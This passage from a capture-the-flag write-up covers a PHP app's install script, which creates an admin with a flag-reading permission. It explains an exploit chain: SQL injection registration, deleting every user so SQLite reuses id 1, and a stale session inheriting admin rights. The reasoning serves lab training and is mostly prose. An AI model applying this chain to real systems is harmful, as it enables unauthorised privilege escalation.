+<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a>    add_perm(<span class="va">$uid</span><span class="ot">,</span> <span class="st">&#39;perms_edit&#39;</span>)<span class="ot">;</span></span>
+<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a>    add_perm(<span class="va">$uid</span><span class="ot">,</span> <span class="st">&#39;perms_delete&#39;</span>)<span class="ot">;</span></span>
+<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a>    add_perm(<span class="va">$uid</span><span class="ot">,</span> <span class="st">&#39;flag_read&#39;</span>)<span class="ot">;</span></span>
+<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a>    rm_tmp_perms(<span class="st">&#39;perms_add&#39;</span>)<span class="ot">;</span></span>
+<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a>    <span class="fu">error_log</span>(<span class="st">&quot;Admin password: </span><span class="va">$admin_pw</span><span class="st">&quot;</span>)<span class="ot">;</span></span>
+<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>We see the script creates the <code>admin</code> user if there is no
+user named <code>admin</code> on the database and gives this user some
+perms including the <code>read_flag</code> perms which is exactly the
+perm we need to get the flag by visiting <code>flag.php</code>.</p>
+<h1 id="putting-everything-together">Putting everything together</h1>
+<p>This is what we managed to perform so far:<br />
+- Register on the app via SQLi<br />
+- Manage to delete any user by passing the id we wish to delete<br />
+- We are able to call the installation script without needing to be
+logged in</p>
+<p>Is there any way we can exploit the application logic in order to
+login as an user which has the <code>read_flag</code> perm?</p>
+<h1 id="exploit">Exploit</h1>
+<p>After thinking for a while we notice that the if we delete all users
+in the database <code>PRIMARY KEY&#39;s</code> has no way to now whats the
+next id, so it re-generates a user with id = 1<br></p>
+<p>And since the <strong>sessions are not destroyed</strong> when we
+delete a user, maybe if we delete all users and manage to create the
+admin user who has <strong>database</strong> id = a previous user’s
+<strong>session</strong> uid, this user’s session perms should be
+acquired from the database where id = <strong>session uid</strong> which
+is the <strong>ADMIN</strong> meaning he inherits the admin’s
+permission.</p>
+<p>We ran a little check locally to verify how SQLite behaves:</p>
+<figure>
+<img role="img" aria-label="img_sqlite" src="data:image/webp;base64,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